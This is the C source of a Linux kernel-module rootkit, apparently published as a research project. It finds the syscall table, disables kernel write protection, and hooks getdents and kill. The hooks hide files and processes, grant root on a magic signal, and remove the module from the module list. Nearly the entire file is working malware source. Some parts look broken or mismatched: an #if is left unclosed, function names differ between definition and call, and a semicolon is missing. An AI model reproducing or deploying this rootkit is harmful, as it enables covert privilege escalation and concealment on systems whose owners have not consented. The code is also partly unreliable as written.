//LKM rootkit main file
//common includes

#include<linux/version.h>
#include<linux/dirent.h>
#include<linux/syscalls.h>
#include<linux/module.h>
#include<linux/slab.h>
#include<linux/sched.h>

//since we are going for backward compatibility so certain includes changes for different kernel versions
/*
The linux/version.h file has a macro called KERNEL_VERSION which will let you check the version you want against the current linux headers version (LINUX_VERSION_CODE) installed. For example to check if the current Linux headers are for kernel v2.6.16 or earlier:
#include <linux/version.h>

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,16)
...
#else
...
#endif
*/

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,18)
#include<linux/unistd.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,26)
#include<linux/proc_ns.h>
#else
#include<linux/proc_fs.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif


#ifndef __NR_getdents
#define __NR_getdents 141  //sys_setpriority
#endif

#include "excursor.h"

//we will now describe some symbols and variables for our functions later on, ofcourse we will do that accroding to kernel versions

#if IS_ENABLED(CONFIG_X86)||IS_ENABLED(CONFIG_X86_64)
unsigned long cr0;
#elif IS_ENABLED(CONFIG_ARM64)
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
#define section_size init_begin - start_rodata
#endif
static unsigned long *__sys_call_table;
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
	static t_syscall orig_getdents;
	static t_syscall orig_getdents64;
	static t_syscall orig_kill;
#else
	typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
		unsigned int);
	typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
		struct linux_dirent64 *, unsigned int);
	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
	orig_getdents_t orig_getdents;
	orig_getdents64_t orig_getdents64;
	orig_kill_t orig_kill;
#endif



unsigned long * get_syscall_table_buffer(void){
	unsigned long *syscall_table;
#if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
#ifdef KPROBE_LOOKUP
	//debugging stuff
	/*KProbes is a debugging mechanism for the Linux kernel which can also be used for 		monitoring events inside a production system. You can use it to weed out performance 		bottlenecks, log specific events, trace problems etc. KProbes was developed by IBM as an 		underlying mechanism for another higher level tracing tool called DProbes*/

	//going to use kallsysm_lookup_name because we don't want our rootkit to get exposed by 	exporting system call table
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	//https://lwn.net/Articles/132196/
	
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
#endif
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
#else
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
#endif
}


struct task_struct * find_task(pid_t pid){
	struct task_struct *p = current;
	//The task_struct structure defined in sched.h stores all the details of every process 		that exists in the system, and all the processes in turn are stored in a circular double 		linked list.

	//https://tuxthink.blogspot.com/2011/03/using-foreachprocess-in-proc-entry.html
	for_each_process(p){
		if (p->pid == pid)
			return p;
	}
	//function iterates through the list of all processess
	return NULL;
}

int invisible(pid_t pid){

	//look whether the PID holds the PF_INVISIBLE flag
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4,16,0)
static asmlinkage long owari_getdents64(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
	int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
	int ret = orig_getdents64(pt_regs), err;
#else

asmlinkage int owari_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
		int ret = orig_getdents64(fd, dirent, count), err;
#endif
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc &&
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))||(proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4,16,0)
static asmlinkage long owari_getdents(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
		int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
	int ret = orig_getdents(pt_regs), err;
#else
asmlinkage int owari_getdents(unsigned int fd, struct linux_dirent __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents(fd, dirent, count), err;
#endif
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3,19,0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc && 
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

void
elevate_root(void)
{
	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
		current->uid = current->gid = 0;
		current->euid = current->egid = 0;
		current->suid = current->sgid = 0;
		current->fsuid = current->fsgid = 0;
	#else
		struct cred *newcreds;
		newcreds = prepare_creds();
		if (newcreds == NULL)
			return;
		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			newcreds->uid.val = newcreds->gid.val = 0;
			newcreds->euid.val = newcreds->egid.val = 0;
			newcreds->suid.val = newcreds->sgid.val = 0;
			newcreds->fsuid.val = newcreds->fsgid.val = 0;
		#else
			newcreds->uid = newcreds->gid = 0;
			newcreds->euid = newcreds->egid = 0;
			newcreds->suid = newcreds->sgid = 0;
			newcreds->fsuid = newcreds->fsgid = 0;
		#endif
		commit_creds(newcreds);
	#endif
}

static inline void tidy(void)
{
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;
void
module_show(void){
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

void module_hide(void){
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4,16,0)
asmlinkage int owari_kill(const struct pt_regs *pt_regs){
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
	pid_t pid = (pid_t) pt_regs->regs[0];
	int sig = (int) pt_regs->regs[1];
#endif
#else
asmlinkage int owari_kill(pid_t pid, int sig){
#endif
	struct task_struct *task;
	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
			elevate_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
			return orig_kill(pt_regs);
#else
			return orig_kill(pid,sig);
#endif
	}
	return 0;
}

/*we know that lkm run in level 0 so we can just write directly to cr0 registry and we don’t need to call write_cr0() function .
__force_order is used to force instruction serialization.
*/
//This changes the WP bit of cr0 register to 1, enabling syscall table overwrite.
#if LINUX_VERSION_CODE > KERNEL_VERSION(4,16,0)
static inline void
write_cr0_forced(unsigned long val){
	unsigned long __force_order;
	asm volatile(
		"mov %0, %%cr0":"+r"(val), "+m"(__force_order));
}
#endif

static inline void
protect_memory(void){
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4,16,0)
	write_cr0_forced(cr0);
#else
	//so if the kernel version is less than 4.16.0 we don't need to force, can just simply 		change the parameter (described in the excursor.h	
	write_cr0(cr0);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, 		PAGE_KERNEL_RO);
#endif
}

//undo everything that we have done, overwrite cr0 WP flag now with 0
unprotect_memory(void){
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0 & ~0x00010000);
#else
	write_cr0(cr0 & ~0x00010000);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,section_size, 		PAGE_KERNEL);
#endif
}

static int __init

//init module for the rootkit
excursor_init(void)
{
	//get_syscall_table_bf is our own version of syscall_table, we're overwriting this into 	the original one
	__sys_call_table = get_syscall_table_bf();
	if (!__sys_call_table)
		return -1;

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	//call to overwrite cr0 WP bit	
	cr0 = read_cr0();
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
#endif

	//call to the hide function	
	module_hide();
	tidy();

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	
	//this is the hooking part, we are overwrting the directory entry (getdents with our fake 		system call, in our case kill system
	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
	//this line puts the orig_getdents on our variable, we will swap this with our own one.
	//getdents is here for our file and directory hiding feature
	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
	//for 64getdents
	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
	//here kill system call is put into the variable
#else

	//for backward kernels	
	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
#endif

	unprotect_memory();
	//this is done so that the module does not crash

	//Now we swap in our fake functions in place of legitimate ones
	__sys_call_table[__NR_getdents] = (unsigned long) owari_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long) owari_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) owari_kill;

	protect_memory();

	return 0;
}

excursor_cleanup(void)
{
	//This is the cleanup module, meaning we will undo everything that we have done on 		init.		
	unprotect_memory();

	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
	
	//now swapping in again the previous and legitimate values in the syscall table.

	protect_memory();
}

module_init(excursor_init);
module_exit(excursor_cleanup);

MODULE_LICENSE("MIT LICENSE");
MODULE_AUTHOR("Sakai01");
MODULE_DESCRIPTION("Linux Kernel Module Rootkit for research purpose!!");
MODULE_VERSION("1.0")

//ok finally it end...
